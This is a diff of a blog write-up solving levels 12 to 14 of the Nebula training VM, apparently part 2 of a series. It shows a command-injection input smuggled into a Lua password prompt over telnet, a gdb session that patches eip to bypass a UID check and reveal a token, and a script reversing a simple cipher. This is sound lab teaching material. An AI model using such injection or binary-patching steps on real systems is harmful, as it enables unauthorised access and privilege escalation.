@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Exploit Education - Nebula: Write-up (Part 1)"
+title: "Exploit Education - Nebula: Write-up (Part 2)"
 date: 2019-06-25 21:44:38.000000000 +8:00
 excerpt: Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.
 tags: [exploit education, solution, nebula]
@@ -91,7 +91,7 @@ To generate a key for "level11", I used `ssh-keygen -t rsa` with default values.
 
 To predict the temporary filename, I use the fact that 2 executables that run consecutively have a pid difference of 1 and the first executable will execute in less than 1 second given the program is simple and the machine is fast. Using the above 2 facts, I created the following C file that pre-creates a file and symlinks it to "/home/flag11/.ssh/authorized_keys". Note that running this file will cause the executable to end pre-maturely as the required input length was not reached, but at this point the file contents have already been written so it does not matter. Replace `buffer` with whatever is in the "id_rsa.pub" file. In this case, encryption/processing is not needed as that is required for `system` only.
 
-```C
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
@@ -129,3 +129,105 @@ int main(int argc, char **argv)
 Using this method, I simply SSHed into flag11's account by `ssh flag11@127.0.0.1`, concluding this level.
 
 
+## Level12
+
+This is a simple problem. The lua script did not sanitise the input received, thus allowing arbitrary code execution during the step `io.popen("echo "..password.." | sha1sum", "r")`. To connect to the listening process, we can use `telnet hostname port`, which would be `telnet 127.0.0.1 50001` in this case. This allows a connection to the listening process. Then, we can design our input to suit the bash code above; I picked "a;getflag > /tmp/a.txt; echo a", which redirects the output of `getflag` to the file "/tmp/a.txt", allowing us to check the results of the code execution. This successfully obtains the flag, and the full process is described below:
+
+```bash
+level12@nebula:~$ telnet 127.0.0.1 50001
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+Password: a; getflag > /tmp/a.txt; echo a
+Better luck next time
+Connection closed by foreign host.
+level12@nebula:~$ cat /tmp/a.txt
+You have successfully executed getflag on a target account
+```
+
+## Level13
+
+The program is quite simple and rigid and there appears to be no problem with the binary itself. However, as we have control of the program environment as well, it is easy to manipulate the state of the binary. This can be done using a debugger, specifically gdb.
+
+Using gdb, we are able to bypass the `if` statement and thus prevent the early exit of the program. I broke the program `main`, and printed the disassembled code. Using that, I determined the location of the `if` statement, and overwrote "eip" (instruction pointer) with the address the statement jumps to when `getuid()` is equal to 1000. This process is described below:
+
+```
+level13@nebula:~$ gdb /home/flag13/flag13
+GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08
+Copyright (C) 2011 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/flag13/flag13...(no debugging symbols found)...done.
+(gdb) break main
+Breakpoint 1 at 0x80484c9
+(gdb) r
+Starting program: /home/flag13/flag13
+
+Breakpoint 1, 0x080484c9 in main ()
+(gdb) x/29 main
+   0x80484c4 <main>:    push   %ebp
+   0x80484c5 <main+1>:  mov    %esp,%ebp
+   0x80484c7 <main+3>:  push   %edi
+   0x80484c8 <main+4>:  push   %ebx
+=> 0x80484c9 <main+5>:  and    $0xfffffff0,%esp
+   0x80484cc <main+8>:  sub    $0x130,%esp
+   0x80484d2 <main+14>: mov    0xc(%ebp),%eax
+   0x80484d5 <main+17>: mov    %eax,0x1c(%esp)
+   0x80484d9 <main+21>: mov    0x10(%ebp),%eax
+   0x80484dc <main+24>: mov    %eax,0x18(%esp)
+   0x80484e0 <main+28>: mov    %gs:0x14,%eax
+   0x80484e6 <main+34>: mov    %eax,0x12c(%esp)
+   0x80484ed <main+41>: xor    %eax,%eax
+   0x80484ef <main+43>: call   0x80483c0 <getuid@plt>
+   0x80484f4 <main+48>: cmp    $0x3e8,%eax
+   0x80484f9 <main+53>: je     0x8048531 <main+109>
+   0x80484fb <main+55>: call   0x80483c0 <getuid@plt>
+   0x8048500 <main+60>: mov    $0x80486d0,%edx
+   0x8048505 <main+65>: movl   $0x3e8,0x8(%esp)
+   0x804850d <main+73>: mov    %eax,0x4(%esp)
+   0x8048511 <main+77>: mov    %edx,(%esp)
+   0x8048514 <main+80>: call   0x80483a0 <printf@plt>
+   0x8048519 <main+85>: movl   $0x804870c,(%esp)
+   0x8048520 <main+92>: call   0x80483d0 <puts@plt>
+   0x8048525 <main+97>: movl   $0x1,(%esp)
+   0x804852c <main+104>:        call   0x80483f0 <exit@plt>
+   0x8048531 <main+109>:        lea    0x2c(%esp),%eax
+   0x8048535 <main+113>:        mov    %eax,%ebx
+   0x8048537 <main+115>:        mov    $0x0,%eax
+(gdb) break *0x80484f9
+Breakpoint 2 at 0x80484f9
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484f9 in main ()
+(gdb) set $eip = 0x8048531
+(gdb) c
+Continuing.
+your token is b705702b-76a8-42b0-8844-3adabbe5ac58
+[Inferior 1 (process 1637) exited with code 063]
+```
+
+Using the token, I am able to log into "flag13" and execute `getflag`.
+
+## Level14
+
+This level is rather trivial. The file "token" contains the string "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.", which should be the result after applying the encryption from the executable. Playing around with the executable, you may notice the first character is always the same in both encrypted and unencrypted text. Furthermore, the second character always differs by 1. From this, I hypothesised that the executable increments the character by its position in the string. This is verified (to an extent) by the following:
+
+```bash
+level14@nebula:/home/flag14$ ./flag14 -e
+aaaaaaaaaa
+abcdefghij
+```
+
+From this point, we can create a python script that reverses the encryption. Running the following script results in "8457c118-887c-4e40-a5a6-33a25353165", which is the password for "flag14". We can then execute `getflag` successfully.
+
+```py
+s = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."
+for i in range(len(s)):
+    print(chr(ord(s[i]) - i), end="")
+```
